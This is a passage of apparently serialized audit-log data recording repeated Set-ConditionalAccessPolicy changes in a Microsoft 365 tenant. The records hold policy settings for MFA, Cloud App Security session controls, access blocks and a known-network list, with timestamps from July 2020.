'{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/17/2020 5:00:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/17/2020 5:00:49 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/18/2020 5:22:18 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/18/2020 5:22:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/19/2020 5:37:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/19/2020 5:37:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/20/2020 2:21:06 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/20/2020 2:21:04 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/20/2020 6:04:37 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/20/2020 6:04:35 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/21/2020 2:08:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/21/2020 2:08:14 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/21/2020 4:59:02 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/21/2020 4:59:02 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/22/2020 2:14:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/22/2020 2:14:19 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/22/2020 5:08:50 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/22/2020 5:08:51 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/23/2020 2:20:37 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/23/2020 2:20:37 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/23/2020 2:20:41 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/23/2020 2:20:40 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/23/2020 2:20:40 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/23/2020 2:20:38 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/23/2020 5:19:51 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/23/2020 5:19:53 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/24/2020 2:30:33 AM', 